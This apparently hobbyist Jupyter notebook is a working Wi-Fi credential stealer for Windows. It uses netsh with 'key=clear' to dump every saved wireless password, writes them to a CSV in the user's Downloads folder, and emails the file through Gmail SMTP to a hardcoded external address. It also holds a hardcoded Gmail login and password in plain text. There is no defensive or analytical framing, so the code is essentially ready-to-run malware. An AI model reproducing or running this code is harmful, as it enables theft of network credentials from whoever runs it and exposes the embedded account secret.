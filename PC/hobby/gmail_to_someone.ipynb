{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib as smtp\n",
    "import subprocess\n",
    "import re\n",
    "import pandas as pd\n",
    "from email.message import EmailMessage"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "command_output = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profiles\"], capture_output = True).stdout.decode()\n",
    "profile_names = (re.findall(\"All User Profile     : (.*)\\r\", command_output))\n",
    "passwords=list()\n",
    "if len(profile_names) != 0:\n",
    "    for name in profile_names:\n",
    "        profile_info = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profile\", name], capture_output = True).stdout.decode()\n",
    "        if re.search(\"Security key           : Absent\", profile_info):\n",
    "            continue\n",
    "        else:\n",
    "            profile_info_pass = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profile\", name, \"key=clear\"], capture_output = True).stdout.decode()\n",
    "            password = re.search(\"Key Content            : (.*)\\r\", profile_info_pass)\n",
    "            if password == None:\n",
    "                passwords.append(\"None\")\n",
    "            else:\n",
    "                passwords.append(password[1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "data = {\n",
    "    \"ID's\": pd.Series(profile_names),\n",
    "    \"Passwords\": pd.Series(passwords),\n",
    "}\n",
    "\n",
    "\n",
    "df = pd.DataFrame(data)\n",
    "#print(df)\n",
    "\n",
    "import getpass\n",
    "username = getpass.getuser()\n",
    "file_name=\"wifi_ids_With_passwords.csv\"\n",
    "first_1=\"C:\\\\Users\\\\\"\n",
    "path = first_1+username+\"\\\\Downloads\\\\\"+file_name\n",
    "df.to_csv(path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "msg = EmailMessage()\n",
    "msg['Subject'] = 'Dummy here'\n",
    "msg['From'] = 'dummygod944@gmail.com'\n",
    "msg['To'] = 'khalidfarrukh951@gmail.com'\n",
    "body = \"MY wifi id's and passwords \"\n",
    "msg.set_content(body)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "files = [path]\n",
    "\n",
    "for file in files:\n",
    "    with open(file,'rb') as f:\n",
    "        file_data=f.read()\n",
    "    msg.add_attachment(file_data,maintype='application',subtype='octet-stream',filename=file_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "cnc = smtp.SMTP('smtp.gmail.com',587)\n",
    "sts=cnc.ehlo()\n",
    "ser_s=cnc.starttls()\n",
    "sts=cnc.ehlo()\n",
    "\n",
    "ln_a=' '\n",
    "if sts[0]==250 and ser_s[0] == 220:\n",
    "    ln_a = cnc.login('dummygod944@gmail.com','howdy1500hi')\n",
    "    if ln_a[0]==235:\n",
    "        cnc.send_message(msg)\n",
    "        cnc.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
